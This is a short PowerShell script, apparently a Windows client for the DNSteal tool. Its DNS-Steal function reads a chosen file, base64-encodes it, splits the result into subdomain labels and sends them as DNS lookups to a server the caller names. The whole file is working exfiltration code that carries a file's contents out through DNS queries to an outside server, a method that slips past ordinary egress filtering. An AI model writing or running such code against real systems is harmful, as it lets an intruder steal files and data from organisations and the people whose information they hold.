#Simple PS script to use DNSteal in Windows machines
function DNS-Steal
{
  Param(
    [Parameter(Mandatory=$true,
    HelpMessage="DNS Server")]
    [String]
    $server, #DNSeatl Server IP
    [Parameter(Mandatory=$true,
    HelpMessage="file")]
    [String]
    $file
  )

  $subdomain=4
  $b=57
  $c=1
  $dom = ""
  $content = Get-Content $file -Encoding UTF8 -Raw
  $EncodedText =[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
  While ($EncodedText)
  { 
    $x,$EncodedText = ([char[]]$EncodedText).where({$_},'Split',$b)
    $x = $x -join ''
    $dom = $dom + $x + "-."
    if ($c -lt $subdomain){
      $c++;
    }else{
      $dom = $dom + $file
      Resolve-DnsName -Name $dom -Server $server
      $dom = "";
      $c=1;
    }
  }
}
